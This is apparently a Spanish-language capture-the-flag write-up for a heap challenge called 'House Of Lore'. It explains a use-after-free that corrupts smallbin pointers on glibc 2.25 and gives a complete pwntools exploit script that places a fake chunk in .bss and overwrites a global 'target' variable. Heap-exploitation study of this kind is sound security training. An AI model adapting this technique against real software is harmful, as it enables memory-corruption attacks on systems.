# House Of Lore

```
   Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'../.glibc/glibc_2.25'
    Stripped:   No
    Debuginfo:  Yes
```

Si existe la posibilidad de obtener una shell en este reto la desconozco. El objetivo de este reto fue sobreescribir la variable global `target`.

En el programa existe una vulnerabilidad UAF que nos permite cambiar los punteros fd y bk de un chunk libre. Usaremos la tecnica que da nombre al reto.

Pasos:
1. Crear un chunk falso en `user` con size=A->size, FD=A y BK=B.
2. Reservar dos chunks: A y B. El primero sera el chunk que ira a unsortedbin, el segundo sera un segundo chunk falso para pasar las verificaciones de `malloc`.
3. Hacemos B->fd=fake_chunk.
4. Liberamos A y con la vulnerabilidad UAF que existe hacemos A->bk=fake_chunk.
5. Hacemos `malloc(0x400)` para que A sea insertado en una smallbin.
6. Hacemos `malloc(A->size)` dos veces, el segundo chunk devuelto se encuentra en `user`.
7. Sobreescribimos `target`.

## Exploit
``` py
from pwn import *
r = process("./house_of_lore")
libc = ELF("../.glibc/glibc_2.25/libc.so.6")
index = 0

def malloc(size):
    global index
    r.send(b"1")
    r.sendafter(b"size: ", str(size).encode())
    r.recvuntil(b"> ")
    index += 1
    return index - 1

def free(index):
    r.send(b"2")
    r.sendafter(b"index: ",str(index).encode())
    r.recvuntil(b"> ")

def edit(index, data):
    r.send(b"3")
    r.sendafter(b"index: ", str(index).encode())
    r.sendafter(b"data: ", data)
    r.recvuntil(b"> ")

r.recvuntil(b"@ ")
libc.address =  int(r.recvline().strip(),16) -  0x68d70
print(hex(libc.address))

r.recvuntil(b"@ ")
heap = int(r.recvline().strip(),16)
print(hex(heap))

# fake_chunk in .bss
# fake_chunk->fd = B
# fake_chunk->bk = A
r.sendafter(b"username:",p64(0) + p64(0xa0) + p64(heap + 0xa0) + p64(heap))

# Allocate victim chunk (0x98 gets aligned to 0xa0 with 0x90 bytes for data, 8 bytes overflow!)
A = malloc(0x98)

# Guard chunk to avoid that A merges with top chunk
B = malloc(0x88)

# Bypass "smallbin double linked list corrupted"
edit(B, p64(0x602010))

# Put A in the unsortedbin
free(A)

# A->bk = fake_chunk
edit(A, p64(0) + p64(0x602010))

# Forcing A to be inserted in a smallbin
C = malloc(0x400)

D = malloc(0x98)

# Alloc fake_chunk
E = malloc(0x98)

# Overwrite target
edit(E, b"A" * 0x20 + b"_s1s1fo_")

r.sendline(b"4")

r.interactive()
```

